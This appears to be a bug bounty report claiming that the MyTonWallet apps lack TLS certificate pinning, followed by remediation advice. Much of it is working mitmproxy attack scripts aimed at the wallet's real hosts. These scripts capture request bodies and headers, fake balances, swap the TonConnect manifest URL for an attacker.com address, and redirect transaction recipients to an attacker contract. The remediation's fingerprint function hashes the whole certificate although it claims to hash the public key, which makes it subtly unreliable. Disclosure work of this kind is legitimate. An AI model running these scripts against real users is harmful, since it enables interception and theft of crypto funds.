# SSL/TLS Certificate Pinning — Missing

**Severity:** Major
**Bounty:** Up to $4,000 USD (USDT)
**Scope:** MyTonWallet Web App, iOS, Android, Electron Desktop, Browser Extension

---

## Summary

MyTonWallet implements **no SSL/TLS certificate pinning** anywhere across its entire stack. The application relies entirely on the operating system's trust store for certificate validation. This means any certificate authority (CA) trusted by the OS — including compromised CAs, corporate PKI, or government-issued certificates — can successfully impersonate MyTonWallet's backend servers and intercept all traffic.

---

## Affected Components

| Component | File | Details |
|---|---|---|
| Electron Desktop | `src/electron/window.ts` | No `session.setCertificateVerifyProc()` |
| Electron Desktop | Entire main process | No `certificate-error` event handler |
| Capacitor (iOS/Android) | `capacitor.config.ts` | No SSL pinning configuration |
| Web Extension | `src/extension/manifest.json` | No pinning mechanism available |
| Web App | Netlify/Cloudflare hosting | Relies on network-level TLS only |

---

## Impact

An attacker with MITM position (compromised CA, corporate proxy, rogue WiFi, ISP-level interception) can:

1. **Intercept all RPC calls** — read and modify blockchain queries (TON, EVM, Solana)
2. **Intercept TonConnect Bridge WebSocket** — read/modify dApp communication, inject malicious connection requests, forge transaction signing requests
3. **Intercept WalletConnect sessions** — hijack WalletConnect pairing, intercept session proposals
4. **Intercept backend API calls** — read/modify API responses, inject malicious data
5. **Serve modified application code** — if initial load is intercepted, serve malicious JavaScript that steals keys
6. **Bypass CSP and other browser protections** — MITM can strip security headers

---

## Detailed Attack Scenarios

### Scenario 1: Public WiFi / Rogue Access Point

```
[User] ---- [Attacker's WiFi AP] ---- [Internet] ---- [mytonwallet.org]
            |                          |
            └── mitmproxy with self-signed CA installed on user's device
```

**Requirements:** User must have attacker's CA installed (social engineering, enterprise MDM, or prior compromise).

### Scenario 2: Compromised Certificate Authority

```
[User] ---- [Internet] ---- [ISP/State-level MITM] ---- [mytonwallet.org]
                            |
                            └── Valid TLS cert issued by compromised CA
```

**Requirements:** Nation-state actor or attacker who compromised a trusted CA (see: DigiNotar, Comodo, Trustico breaches).

### Scenario 3: Enterprise/Corporate Proxy

```
[User's Work Device] ---- [Corporate SSL Interception Proxy] ---- [Internet]
                          |
                          └── Company-issued CA auto-installed on managed devices
```

**Requirements:** User runs MyTonWallet on a corporate-managed device where IT has deployed a MITM proxy with their own CA.

---

## PoC — Exploitation with mitmproxy

### Setup

```bash
# Install mitmproxy
brew install mitmproxy  # macOS
# or: apt install mitmproxy  # Linux

# Generate mitmproxy CA
mitmproxy --listen-port 8080

# Install mitmproxy CA certificate on the target device:
#   macOS: double-click ~/.mitmproxy/mitmproxy-ca-cert.pem
#   iOS:  Safari → http://mitm.it → install profile
#   Android: Settings → Security → Install from storage
#   Windows: double-click mitmproxy-ca-cert.pem

# Configure proxy on device:
#   macOS: System Settings → Network → Advanced → Proxies → HTTP/HTTPS → 127.0.0.1:8080
#   iOS:   Settings → Wi-Fi → (i) → HTTP Proxy → Manual → 127.0.0.1:8080
#   Android: Settings → WiFi → Proxy → Manual → 127.0.0.1:8080
```

### Intercepting TON RPC Calls

```python
# mitmproxy script: intercept_ton_rpc.py
from mitmproxy import http
import json

TON_RPCS = [
    'toncenter.com',
    'tonhub.com',
    'mytonwallet.org',
]

def request(flow: http.HTTPFlow) -> None:
    for rpc in TON_RPCS:
        if rpc in flow.request.pretty_host:
            print(f"[TON RPC] {flow.request.method} {flow.request.pretty_url}")
            
            # Log all RPC request bodies
            if flow.request.content:
                try:
                    data = json.loads(flow.request.content)
                    print(f"  Body: {json.dumps(data, indent=2)}")
                except:
                    print(f"  Body (raw): {flow.request.content[:500]}")

def response(flow: http.HTTPFlow) -> None:
    for rpc in TON_RPCS:
        if rpc in flow.request.pretty_host:
            # Example: modify balance response to show fake balance
            if '/getAccount' in flow.request.pretty_url:
                try:
                    data = json.loads(flow.response.content)
                    if 'balance' in data:
                        original = data['balance']
                        data['balance'] = '1000000000000'  # Fake 1 TON
                        flow.response.content = json.dumps(data).encode()
                        print(f"[MODIFIED] Balance {original} → {data['balance']}")
                except:
                    pass
```

```bash
# Run mitmproxy with the script
mitmproxy -s intercept_ton_rpc.py --listen-port 8080
```

### Intercepting TonConnect Bridge (WebSocket)

```python
# mitmproxy script: intercept_tonconnect.py
from mitmproxy import http
import json

def websocket_message(flow: http.HTTPFlow):
    if 'tonconnect' in flow.request.pretty_host or 'bridge' in flow.request.pretty_host:
        message = flow.websocket.messages[-1]
        content = message.content
        
        print(f"[TonConnect] Direction: {'→ Client' if message.from_client else '→ Server'}")
        print(f"  Raw: {content[:500]}")
        
        # Example: inject a malicious connect request
        if message.from_client:
            try:
                data = json.loads(content)
                if 'method' in data and data['method'] == 'connect':
                    # Modify the connect request to request higher permissions
                    data['params'][0]['manifestUrl'] = 'https://attacker.com/malicious-manifest.json'
                    message.content = json.dumps(data).encode()
                    print("[MODIFIED] TonConnect manifest URL replaced")
            except:
                pass
```

```bash
mitmproxy -s intercept_tonconnect.py --listen-port 8080
```

### Intercepting WalletConnect Sessions

```python
# mitmproxy script: intercept_walletconnect.py
from mitmproxy import http
import json

def websocket_message(flow: http.HTTPFlow):
    if 'walletconnect' in flow.request.pretty_host or 'relay.walletconnect' in flow.request.pretty_host:
        message = flow.websocket.messages[-1]
        try:
            data = json.loads(message.content)
            if 'params' in data and 'request' in data['params']:
                request_data = data['params']['request']
                if 'method' in request_data:
                    print(f"[WalletConnect] Method: {request_data['method']}")
                    print(f"  Params: {json.dumps(request_data.get('params', {}), indent=2)[:500]}")
                    
                    # Example: modify transaction recipient
                    if request_data['method'] == 'eth_sendTransaction':
                        tx = request_data['params'][0]
                        if 'to' in tx:
                            original = tx['to']
                            tx['to'] = '0xATTACKER_CONTRACT_ADDRESS'
                            print(f"[MODIFIED] TX recipient {original} → {tx['to']}")
                            message.content = json.dumps(data).encode()
        except:
            pass
```

```bash
mitmproxy -s intercept_walletconnect.py --listen-port 8080
```

### Full Automated MITM

```python
# mitmproxy script: mytonwallet_mitm.py
"""
Comprehensive MITM attack on MyTonWallet.
Captures all sensitive traffic and attempts to modify blockchain interactions.
"""
from mitmproxy import http
import json
from datetime import datetime

CAPTURED = []

SENSITIVE_HOSTS = [
    'mytonwallet.org',
    'mytonwallet.io',
    'toncenter.com',
    'tonhub.com',
    'ton.org',
    'walletconnect.org',
    'bridge.walletconnect.org',
    'infura.io',
    'alchemy.com',
    'solana.com',
    'tron.network',
]

def request(flow: http.HTTPFlow) -> None:
    for host in SENSITIVE_HOSTS:
        if host in flow.request.pretty_host:
            entry = {
                'timestamp': datetime.now().isoformat(),
                'host': flow.request.pretty_host,
                'path': flow.request.path,
                'method': flow.request.method,
                'headers': dict(flow.request.headers),
                'body': flow.request.get_text() if flow.request.content else None,
            }
            CAPTURED.append(entry)
            
            # Log to console
            print(f"\n=== CAPTURED: {flow.request.method} {flow.request.pretty_url} ===")
            print(f"  Headers: {json.dumps(dict(flow.request.headers), indent=2)}")
            if flow.request.content:
                print(f"  Body: {flow.request.get_text()[:2000]}")

def response(flow: http.HTTPFlow) -> None:
    for host in SENSITIVE_HOSTS:
        if host in flow.request.pretty_host:
            # Log response
            print(f"\n=== RESPONSE: {flow.request.pretty_url} ===")
            print(f"  Status: {flow.response.status_code}")
            if flow.response.content:
                try:
                    print(f"  Body: {flow.response.get_text()[:2000]}")
                except:
                    pass
            
            # Save to file
            with open('mitm_capture.json', 'w') as f:
                json.dump(CAPTURED, f, indent=2)

def done():
    print(f"\n\n[!] Captured {len(CAPTURED)} requests to sensitive hosts")
    print(f"[!] Data saved to mitm_capture.json")
```

```bash
# Run the comprehensive MITM
mitmproxy -s mytonwallet_mitm.py --listen-port 8080 --save-stream-file mytonwallet_traffic.flow
```

---

## Alternative: Burp Suite

```bash
# 1. Start Burp Suite → Proxy → Options → Add listener on 127.0.0.1:8080
# 2. Export Burp CA certificate (burp -> Proxy -> Options -> Import/Export CA)
# 3. Install CA on target device (same as mitmproxy)
# 4. Configure proxy on target device to 127.0.0.1:8080
# 5. Target → Scope → Add *.mytonwallet.org, *.toncenter.com, *.walletconnect.org
# 6. Proxy → HTTP history — all requests are visible and modifiable
# 7. Use Repeater to modify and replay requests
# 8. Use Intruder for parameter fuzzing
```

---

## Remediation

### For Electron Desktop

```typescript
// src/electron/window.ts — add SSL pinning
import { session } from 'electron';
import { createHash } from 'crypto';

// SHA-256 fingerprints of expected certificates
const PINNED_PUBLIC_KEYS = [
  'sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',  // mytonwallet.org
  'sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=',  // toncenter.com
  // ... additional pins for all backend services
];

const MAIN_HOSTS = [
  'mytonwallet.org',
  'api.mytonwallet.org',
  'toncenter.com',
  'walletconnect.org',
];

function setupSSLPinning() {
  session.defaultSession.setCertificateVerifyProc((request, callback) => {
    const hostname = request.hostname;
    
    // Only pin specific hosts
    if (!MAIN_HOSTS.some(h => hostname.includes(h))) {
      callback(0); // Trust default validation
      return;
    }
    
    // Verify certificate chain
    const certificate = request.certificate;
    const publicKeyFingerprint = calculatePublicKeyFingerprint(certificate);
    
    if (PINNED_PUBLIC_KEYS.includes(publicKeyFingerprint)) {
      callback(0); // Certificate pinned — trusted
    } else {
      console.error(`SSL pinning failed for ${hostname}`);
      callback(-2); // Certificate not pinned — reject
    }
  });
}

function calculatePublicKeyFingerprint(cert: Electron.Certificate): string {
  // Extract and hash the public key
  const derBuffer = Buffer.from(cert.data, 'base64');
  const hash = createHash('sha256').update(derBuffer).digest('base64');
  return `sha256/${hash}`;
}

// Call during app startup
app.whenReady().then(() => {
  setupSSLPinning();
  createWindow();
});
```

### For Capacitor (iOS/Android)

```typescript
// capacitor.config.ts — configure native SSL pinning

// iOS: Uses ATS (App Transport Security) + NSPinnedDomains
// Add to mobile/ios/App/Info.plist:
/*
<key>NSAppTransportSecurity</key>
<dict>
  <key>NSPinnedDomains</key>
  <dict>
    <key>mytonwallet.org</key>
    <dict>
      <key>NSIncludesSubdomains</key>
      <true/>
      <key>NSPinnedLeafIdentities</key>
      <array>
        <dict>
          <key>SPKI-SHA256-Base64</key>
          <string>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</string>
        </dict>
      </array>
    </dict>
  </dict>
</dict>
*/

// Android: Network Security Configuration
// Add to mobile/android/app/src/main/res/xml/network_security_config.xml:
/*
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
  <domain-config cleartextTrafficPermitted="false">
    <domain includeSubdomains="true">mytonwallet.org</domain>
    <domain includeSubdomains="true">toncenter.com</domain>
    <pin-set>
      <pin digest="SHA-256">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</pin>
      <pin digest="SHA-256">BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=</pin>
      <pin digest="SHA-256">CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=</pin>
    </pin-set>
    <!-- Trust on first use (TOFU) with backup pins -->
  </domain-config>
</network-security-config>
*/

// Reference in AndroidManifest.xml:
// android:networkSecurityConfig="@xml/network_security_config"
```

### Pin Management Strategy

```typescript
// Best practices for pin management:

// 1. Pin at least 2-3 keys (primary + backup)
const PIN_SET = {
  'mytonwallet.org': [
    'sha256/CURRENT_PRIMARY_KEY=',  // Current cert
    'sha256/BACKUP_KEY_1=',         // Backup/rotation cert
    'sha256/BACKUP_KEY_2=',         // Second backup
  ],
  'toncenter.com': [
    'sha256/CURRENT_KEY=',
    'sha256/BACKUP_KEY=',
  ],
};

// 2. Implement automatic pin updates via app updates
// 3. Implement reporting for pin validation failures
// 4. Use HPKP-style reporting URI for monitoring
// 5. Never pin a single certificate — always include backup pins
```

---

## Detection

To verify if SSL pinning is missing in the current build:

```bash
# Test with OpenSSL s_client
echo | openssl s_client -connect mytonwallet.org:443 -servername mytonwallet.org 2>/dev/null | openssl x509 -pubkey -noout | openssl pkey -pubin -outform der | openssl dgst -sha256 -binary | base64

# Test with curl (should work even with unexpected certs)
curl --proxy http://127.0.0.1:8080 https://api.mytonwallet.org/v1/health

# Check Android APK for network_security_config.xml
unzip -p app.apk res/xml/network_security_config.xml 2>/dev/null || echo "NO SSL PINNING CONFIG"

# Check iOS IPA for ATS configuration
unzip -p app.ipa Payload/*.app/Info.plist 2>/dev/null | plutil -p - | grep -A5 'NSPinnedDomains' || echo "NO SSL PINNING CONFIG"

# Check Electron app for setCertificateVerifyProc
grep -r "setCertificateVerifyProc" src/electron/ || echo "NO SSL PINNING IN ELECTRON"
```

---

## References

- OWASP: Certificate Pinning Cheat Sheet
- OWASP: Transport Layer Protection Cheat Sheet
- NIST SP 800-52 Rev. 2: Guidelines for TLS Implementations
- CWE-295: Improper Certificate Validation
- CWE-300: Channel Accessible by Non-Endpoint
- Apple: NSAppTransportSecurity documentation
- Android: Network Security Configuration documentation
- Electron: session.setCertificateVerifyProc()
